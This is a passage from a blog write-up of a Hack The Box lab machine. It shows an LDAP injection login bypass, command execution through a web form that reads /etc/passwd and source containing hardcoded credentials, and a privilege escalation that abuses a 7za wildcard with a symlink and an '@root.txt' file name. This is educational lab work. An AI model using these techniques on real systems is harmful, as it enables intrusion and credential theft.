<p><br> I installed <a href="https://github.com/cernekee/stoken" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">stoken</code></a> (<code class="highlighter-rouge">apt-get install stoken</code>), Then I imported the token :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stoken import --token 285449490011357156531651545652335570713167411445727140604172141456711102716717000
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ctf/10.png" alt=""><br> 
<br> I didn’t type any password I left it blank. We can either use the <code class="highlighter-rouge">cli</code> or the <code class="highlighter-rouge">gui</code>, for the <code class="highlighter-rouge">cli</code> you have to start <code class="highlighter-rouge">stoken</code> and enter the pin then you will get the <code class="highlighter-rouge">OTP</code>, and for another <code class="highlighter-rouge">OTP</code> you’ll need to start <code class="highlighter-rouge">stoken</code> again.
<br><img src="/images/hackthebox/ctf/11.png" alt=""><br>
<br> So I just used the <code class="highlighter-rouge">gui</code> as it’s better :
<br><img src="/images/hackthebox/ctf/12.png" alt=""><br></p>
<hr>

<h2 id="rce-user-flag">RCE, User Flag</h2>
<p><br> Let’s login and see what’s there :
<br><img src="/images/hackthebox/ctf/13.png" alt=""><br>
<br> <code class="highlighter-rouge">%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a</code> is <code class="highlighter-rouge">*)(uid=*))(|(uid=*</code> url-encoded.
<br> It redirected me to <code class="highlighter-rouge">/page.php</code> which I can use to execute commands :
<br><img src="/images/hackthebox/ctf/14.png" alt=""><br>
<br> I tried <code class="highlighter-rouge">whoami</code> and it worked fine:
<br><img src="/images/hackthebox/ctf/15.png" alt=""><br>
<br> I switched to burp to make things easier, I wanted to read <code class="highlighter-rouge">/etc/passwd</code> to know the users :
<br> Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/page.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">ctf.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ctf.htb/page.php</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">42</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

inputCmd=cat /etc/passwd&amp;inputOTP=52447058

</code></pre></div></div>
<p><br> Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 19 Jul 2019 21:58:13 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</span>
<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/5.4.16</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">4005</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>

<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
        ----------------
         Removed Output
        ----------------
<span class="nt">&lt;pre&gt;</span>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
ldapuser:x:1000:1000::/home/ldapuser:/bin/bash
<span class="nt">&lt;/pre&gt;</span>
        ----------------
         Removed Output
        ----------------
</code></pre></div></div>
<p><br> We can see that <code class="highlighter-rouge">ldapuser</code> is an actual user on the box, I tried to get a reverse shell but for some reason I couldn’t get a reverse shell at all so I started to look in the web files. I was already in the web directory :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=pwd&amp;inputOTP=14546713

/var/www/html
</code></pre></div></div>
<p><br> I listed the files :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=ls -la&amp;inputOTP=14546713

total 36
drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
-rw-r--r--. 1 root   root      0 Jul 20 00:03 banned.txt
-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
</code></pre></div></div>
<p><br> I started looking for any hardcoded credentials in the <code class="highlighter-rouge">php</code> files, in <code class="highlighter-rouge">login.php</code> I found credentials for <code class="highlighter-rouge">ldapuser</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=cat login.php<span class="err">&amp;</span>inputOTP=04181897

<span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$strErrorMsg</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>

<span class="nv">$username</span> <span class="o">=</span> <span class="s1">'ldapuser'</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s1">'e398e27d5c4ad45086fe431120932a01'</span><span class="p">;</span>

<span class="nv">$basedn</span> <span class="o">=</span> <span class="s1">'dc=ctf,dc=htb'</span><span class="p">;</span>
<span class="nv">$usersdn</span> <span class="o">=</span> <span class="s1">'cn=users'</span><span class="p">;</span>

<span class="c1">// This code uses the START_TLS command
</span>
<span class="nv">$ldaphost</span> <span class="o">=</span> <span class="s2">"ldap://ctf.htb"</span><span class="p">;</span>
<span class="nv">$ldapUsername</span>  <span class="o">=</span> <span class="s2">"cn=</span><span class="nv">$username</span><span class="s2">"</span><span class="p">;</span>

<span class="nv">$ds</span> <span class="o">=</span> <span class="nb">ldap_connect</span><span class="p">(</span><span class="nv">$ldaphost</span><span class="p">);</span>
<span class="nv">$dn</span> <span class="o">=</span> <span class="s2">"uid=ldapuser,ou=People,dc=ctf,dc=htb"</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">))</span>
<span class="p">{</span>
    <span class="c1">//var_dump($_POST);
</span>    <span class="nv">$username1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'inputUsername'</span><span class="p">];</span>
    <span class="nv">$OPT1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'inputOTP'</span><span class="p">];</span>

    <span class="nv">$regex</span><span class="o">=</span><span class="s1">'/[()*&amp;|!=&gt;&lt;~]/'</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$username1</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$username2</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$username1</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">ldap_set_option</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nx">LDAP_OPT_PROTOCOL_VERSION</span><span class="p">,</span> <span class="mi">3</span><span class="p">)){</span>
            <span class="k">print</span> <span class="s2">"Could not set LDAPv3</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ldap_start_tls</span><span class="p">(</span><span class="nv">$ds</span><span class="p">))</span> <span class="p">{</span>
           <span class="k">print</span> <span class="s2">"Could not start secure TLS connection"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// now we need to bind to the ldap server
</span>            <span class="nv">$bth</span> <span class="o">=</span> <span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nv">$dn</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">Could not connect to LDAP server</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">);</span>

            <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">"(&amp;(objectClass=inetOrgPerson)(uid=</span><span class="nv">$username2</span><span class="s2">))"</span><span class="p">;</span>
            <span class="c1">// fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
</span>            <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">"(&amp;(&amp;(objectClass=inetOrgPerson)(uid=</span><span class="nv">$username2</span><span class="s2">))(pager=*))"</span><span class="p">;</span>
            <span class="c1">//echo $filter.PHP_EOL;
</span>            <span class="k">if</span> <span class="p">(</span><span class="nv">$search</span><span class="o">=@</span><span class="nb">ldap_search</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nv">$basedn</span><span class="p">,</span> <span class="nv">$filter</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$info</span> <span class="o">=</span> <span class="nb">ldap_get_entries</span><span class="p">(</span><span class="nv">$ds</span><span class="p">,</span> <span class="nv">$search</span><span class="p">);</span>

                <span class="k">if</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"count"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$token_string</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'pager'</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>
                    <span class="c1">//echo $token_string;
</span>                    <span class="nv">$token</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/usr/bin/stoken --token=</span><span class="nv">$token_string</span><span class="s2"> --pin=0000"</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="nv">$token</span> <span class="o">==</span> <span class="nv">$OPT1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$strErrorMsg</span> <span class="o">=</span> <span class="s2">"Login ok"</span><span class="p">;</span>
                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$username1</span><span class="p">;</span>
                        <span class="nb">header</span> <span class="p">(</span><span class="s1">'Location: /page.php'</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">else</span> <span class="p">{</span>
                        <span class="nv">$strErrorMsg</span> <span class="o">=</span> <span class="s2">"Cannot login"</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span>
                    <span class="nv">$strErrorMsg</span> <span class="o">=</span> <span class="s2">"User </span><span class="nv">$username1</span><span class="s2"> not found"</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br> ` ldapuser : e398e27d5c4ad45086fe431120932a01<code class="highlighter-rouge">
&lt;br&gt; </code>ssh` :
<br><img src="/images/hackthebox/ctf/16.png" alt=""><br>
<br> We owned user.
<br></p>
<hr>

<h2 id="7z-list-files-and-wildcards-root-flag">7z List Files and Wildcards, Root Flag</h2>
<p><br> Before enumerating anything I just checked the directories and stuff like that, in <code class="highlighter-rouge">/</code> I saw a directory called <code class="highlighter-rouge">backup</code></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf /]$ ls -al
total 32
dr-xr-xr-x.  18 root root  238 Jul 31  2018 .
dr-xr-xr-x.  18 root root  238 Jul 31  2018 ..
drwxr-xr-x.   2 root root 4096 Jul 20 00:07 backup
lrwxrwxrwx.   1 root root    7 Jul 30  2018 bin -&gt; usr/bin
dr-xr-xr-x.   5 root root 4096 Oct 16  2018 boot
drwxr-xr-x.  20 root root 3180 Jul 19 23:34 dev
drwxr-xr-x.  90 root root 8192 Dec  9  2018 etc
drwxr-xr-x.   3 root root   22 Jul 30  2018 home
lrwxrwxrwx.   1 root root    7 Jul 30  2018 lib -&gt; usr/lib
lrwxrwxrwx.   1 root root    9 Jul 30  2018 lib64 -&gt; usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   3 root root   16 Jul 30  2018 opt
dr-xr-xr-x. 119 root root    0 Jul 19 23:33 proc
dr-xr-x---.   7 root root 4096 Dec  9  2018 root
drwxr-xr-x.  31 root root  920 Jul 19 23:34 run
lrwxrwxrwx.   1 root root    8 Jul 30  2018 sbin -&gt; usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x.  13 root root    0 Jul 19 23:34 sys
drwxrwxrwt.  10 root root 4096 Jul 20 00:06 tmp
drwxr-xr-x.  13 root root  155 Jul 30  2018 usr
drwxr-xr-x.  21 root root 4096 Jul 30  2018 var
[ldapuser@ctf /]$ 
</code></pre></div></div>
<p><br> It had a lot of archives, an error log and a script called <code class="highlighter-rouge">honeypot.sh</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf backup]$ ls -al
total 52
drwxr-xr-x.  2 root root 4096 Jul 20 00:07 .
dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
-rw-r--r--.  1 root root   32 Jul 19 23:57 backup.1563573421.zip
-rw-r--r--.  1 root root   32 Jul 19 23:58 backup.1563573481.zip
-rw-r--r--.  1 root root   32 Jul 19 23:59 backup.1563573541.zip
-rw-r--r--.  1 root root   32 Jul 20 00:00 backup.1563573602.zip
-rw-r--r--.  1 root root   32 Jul 20 00:01 backup.1563573661.zip
-rw-r--r--.  1 root root   32 Jul 20 00:02 backup.1563573721.zip
-rw-r--r--.  1 root root   32 Jul 20 00:03 backup.1563573781.zip
-rw-r--r--.  1 root root   32 Jul 20 00:04 backup.1563573841.zip
-rw-r--r--.  1 root root   32 Jul 20 00:05 backup.1563573901.zip
-rw-r--r--.  1 root root   32 Jul 20 00:06 backup.1563573961.zip
-rw-r--r--.  1 root root   32 Jul 20 00:07 backup.1563574022.zip
-rw-r--r--.  1 root root    0 Jul 20 00:07 error.log
-rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh
[ldapuser@ctf backup]$ 
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">honeypot.sh</code> :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>ldapuser@ctf backup]<span class="nv">$ </span><span class="nb">cat </span>honeypot.sh 
<span class="c"># get banned ips from fail2ban jails and update banned.txt</span>
<span class="c"># banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)</span>
/usr/sbin/ipset list | <span class="nb">grep </span>fail2ban <span class="nt">-A</span> 7 | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'</span> | sort <span class="nt">-u</span> <span class="o">&gt;</span> /var/www/html/banned.txt
<span class="c"># awk '$1=$1' ORS='&lt;br&gt;' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt</span>

<span class="c"># some vars in order to be sure that backups are protected</span>
<span class="nv">now</span><span class="o">=</span><span class="k">$(</span>date +<span class="s2">"%s"</span><span class="k">)</span>
<span class="nv">filename</span><span class="o">=</span><span class="s2">"backup.</span><span class="nv">$now</span><span class="s2">"</span>
<span class="nv">pass</span><span class="o">=</span><span class="k">$(</span>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> 0xEA31 <span class="nt">-in</span> /root/root.txt | md5sum | awk <span class="s1">'{print $1}'</span><span class="k">)</span>

<span class="c"># keep only last 10 backups</span>
<span class="nb">cd</span> /backup
<span class="nb">ls</span> <span class="nt">-1t</span> <span class="k">*</span>.zip | tail <span class="nt">-n</span> +11 | xargs rm <span class="nt">-f</span>

<span class="c"># get the files from the honeypot and backup 'em all</span>
<span class="nb">cd</span> /var/www/html/uploads
7za a /backup/<span class="nv">$filename</span>.zip <span class="nt">-t7z</span> <span class="nt">-snl</span> <span class="nt">-p</span><span class="nv">$pass</span> <span class="nt">--</span> <span class="k">*</span>

<span class="c"># cleaup the honeypot</span>
rm <span class="nt">-rf</span> <span class="nt">--</span> <span class="k">*</span>

<span class="c"># comment the next line to get errors for debugging</span>
truncate <span class="nt">-s</span> 0 /backup/error.log
<span class="o">[</span>ldapuser@ctf backup]<span class="nv">$ </span>
</code></pre></div></div>
<p><br> Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use <code class="highlighter-rouge">pspy</code>, it was obvious since it’s accessing <code class="highlighter-rouge">/root/root.txt</code> to create the password and only root can access that.
<br> 	Basically one of the things that this script is doing is that it’s backing up all the files in <code class="highlighter-rouge">/var/www/html/uploads</code> by using <code class="highlighter-rouge">7za</code> to put all the uploads in one archive. Let’s look at the command again :
<code class="highlighter-rouge">7za a /backup/$filename.zip -t7z -snl -p$pass -- *</code>
<br> 	It’s using the wildcard asterisk (<code class="highlighter-rouge">*</code>) to get all files. This means that if we can write to <code class="highlighter-rouge">/var/www/html/uploads</code> our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the <code class="highlighter-rouge">7za</code> command. 
<br> It’s also using this option : <code class="highlighter-rouge">-snl</code>, I checked the manual page for <code class="highlighter-rouge">7za</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       -snl   Store symbolic links as links
</code></pre></div></div>
<p><br> Note that we can’t unzip the created backups, so even if we created a symlink to <code class="highlighter-rouge">root.txt</code> in <code class="highlighter-rouge">/var/www/html/uploads</code> we won’t be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.
<br> After searching for some time I found <a href="https://sevenzip.osdn.jp/chm/cmdline/syntax.htm" target="_blank" rel="noopener noreferrer">this page</a> which talks about a feature in <code class="highlighter-rouge">7z</code> called list files. I thought if I created 2 files, <code class="highlighter-rouge">root.txt</code> and <code class="highlighter-rouge">@root.txt</code>, <code class="highlighter-rouge">root.txt</code> is a <code class="highlighter-rouge">symlink</code> to <code class="highlighter-rouge">/root/root.txt</code>, when the command is executed and gets to <code class="highlighter-rouge">@root.txt</code> it will treat that as a list file option then it will search for <code class="highlighter-rouge">root.txt</code> to use it as a list file. However that file isn’t a real list file (that may cause an error), also it’s a <code class="highlighter-rouge">symlink</code> to <code class="highlighter-rouge">/root/root.txt</code>. 
<br> I went to <code class="highlighter-rouge">/var/www/html/uploads</code> and I didn’t even have read access.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ldapuser@ctf backup]$ cd /var/www/html/uploads/
[ldapuser@ctf uploads]$ ls -al
ls: cannot open directory .: Permission denied
[ldapuser@ctf uploads]$ 
</code></pre></div></div>
<p><br> so I went back to the <code class="highlighter-rouge">RCE</code> requests in burp and tried as <code class="highlighter-rouge">apache</code>.
<br> I created a <code class="highlighter-rouge">symlink</code> to <code class="highlighter-rouge">/root/root.txt</code> as <code class="highlighter-rouge">root.txt</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=ln -s /root/root.txt uploads/root.txt&amp;inputOTP=91913130
</code></pre></div></div>
<p><br> Then I created an empty file and called it <code class="highlighter-rouge">@root.txt</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=touch uploads/@root.txt&amp;inputOTP=91913130
</code></pre></div></div>
<p><br> Let’s check the directory listing now :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inputCmd=ls -la uploads&amp;inputOTP=91913130

total 0
drwxr-x--x. 2 apache apache  39 Jul 20 01:12 .
drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..
-rw-r--r--. 1 apache apache   0 Jul 20 01:12 @root.txt
lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&gt; /root/root.txt
</code></pre></div></div>
<p><br> Everything is fine let’s check the error log :
<br><img src="/images/hackthebox/ctf/17.png" alt=""><br>
<br> And we owned root !
<br> That’s it , Feedback is appreciated !
<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/friendzone/">Hack The Box - Friendzone</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/wall/">
            Hack The Box - Wall
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/heist/">
            Hack The Box - Heist
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/chainsaw/">
            Hack The Box - Chainsaw
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
